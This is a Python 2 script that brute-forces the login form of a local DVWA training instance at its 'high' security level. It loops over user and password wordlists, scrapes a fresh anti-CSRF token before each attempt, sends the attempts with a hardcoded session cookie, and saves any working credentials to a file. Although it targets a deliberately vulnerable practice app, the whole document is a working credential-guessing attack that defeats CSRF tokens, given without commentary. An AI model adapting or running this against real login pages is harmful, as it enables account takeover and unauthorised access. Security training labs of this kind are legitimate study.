import os,sys,urllib2
from sys import argv
from BeautifulSoup import BeautifulSoup as Soup
scripts, userlist, passwordlist = argv
    #Check parameters
if len(sys.argv) != 3:
        sys.stderr.write('Usage: ' + sys.argv[0]+ ' userlist passwordlist\n')
        sys.exit(1)

if not os.path.exists(userlist):
        sys.stderr.write('userlist was not found\n')
        sys.exit(1)

if not os.path.exists(passwordlist):
        sys.stderr.write('passwordlist was not found\n')
        sys.exit(1)

else:
        print "Loading your lists..."
    #Read and split userfile
        userfile = open(userlist, "r")
        users = userfile.read().split("\n")

        userfile.close()
    #Read and split passfile
        passfile = open(passwordlist, "r")
        passwords = passfile.read().split("\n")

        passfile.close()
    #Take the parameters and make requests
        for user in users:
            for password in passwords:
                
                url1 = "http://127.0.0.1/DVWA-master/vulnerabilities/brute/index.php"
                req = urllib2.Request(url1)
                req.add_header("Cookie", "security=high; PHPSESSID=5vjrghoqdkum5g6f9ls4lcpop6")
                response = urllib2.urlopen(req)
                html = response.read()
                soup =Soup(html)
                csrf_token = soup.findAll(attrs={"name" : "user_token"})[0].get('value')
                print "Trying  %s : %s with csrf token : %s" % (user, password,csrf_token)
                url = "http://127.0.0.1/DVWA-master/vulnerabilities/brute/index.php?username=%s&password=%s&Login=Login&user_token=%s#" %(user,password,csrf_token)
                req = urllib2.Request(url)
                req.add_header("Cookie", "security=high; PHPSESSID=5vjrghoqdkum5g6f9ls4lcpop6")
                response = urllib2.urlopen(req)
                html = response.read()
                
    #Print and write into a file succesful attempts
                if "Username and/or password incorrect." not in html:
                    print "Login : Password are  %s : %s" %(user, password)
                    pas = open('done.txt','a')
                    pas.write('%s : %s \n' %(user,password))
                    pas.close()
                    
                    sys.exit(1)
